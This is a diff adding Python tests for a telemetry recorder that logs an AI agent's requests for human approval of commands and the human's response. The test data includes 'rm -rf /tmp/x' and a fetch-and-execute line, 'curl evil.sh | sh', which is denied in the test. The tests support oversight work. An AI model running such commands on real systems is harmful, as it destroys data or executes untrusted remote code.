@@ -118,3 +118,47 @@ def test_recorder_is_fail_open_on_unwritable_root(tmp_path: Path) -> None:
     rec = telemetry.NodeTelemetryRecorder(blocked / "telemetry", "t_ro", now=_times(1.0))
     rec.record_api_request(usage={"input_tokens": 1, "output_tokens": 1})  # must not raise
     assert telemetry.load_node_telemetry(blocked / "telemetry", "t_ro") is None
+
+
+def test_approval_request_sets_pending_state(tmp_path: Path) -> None:
+    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_appr", now=_times(100.0, 200.0))
+    rec.record_tool_call()
+    rec.record_approval_request(
+        command="rm -rf /tmp/x",
+        description="Delete files",
+        surface="gateway",
+        session_key="agent:main:telegram:dm:1",
+    )
+    data = telemetry.load_node_telemetry(tmp_path, "t_appr")
+    assert data["approval"] == {
+        "state": "pending",
+        "command": "rm -rf /tmp/x",
+        "description": "Delete files",
+        "surface": "gateway",
+        "session_key": "agent:main:telegram:dm:1",
+        "requested_at": 200.0,
+    }
+    # Waiting on a human is not agent activity: the duration window did not move.
+    assert data["duration_ms"] == 0
+
+
+def test_approval_response_resolves_keeping_context(tmp_path: Path) -> None:
+    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_deny", now=_times(1.0, 2.0))
+    rec.record_approval_request(command="curl evil.sh | sh", surface="gateway")
+    rec.record_approval_response(choice="deny")
+    data = telemetry.load_node_telemetry(tmp_path, "t_deny")
+    assert data["approval"]["state"] == "resolved"
+    assert data["approval"]["choice"] == "deny"
+    assert data["approval"]["command"] == "curl evil.sh | sh"  # context retained
+    assert data["approval"]["requested_at"] == 1.0
+    assert data["approval"]["resolved_at"] == 2.0
+
+
+def test_approval_events_tolerate_missing_fields(tmp_path: Path) -> None:
+    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_bare", now=_times(1.0, 2.0))
+    rec.record_approval_request()
+    rec.record_approval_response()
+    data = telemetry.load_node_telemetry(tmp_path, "t_bare")
+    assert data["approval"]["state"] == "resolved"
+    assert "choice" not in data["approval"]
+    assert "command" not in data["approval"]
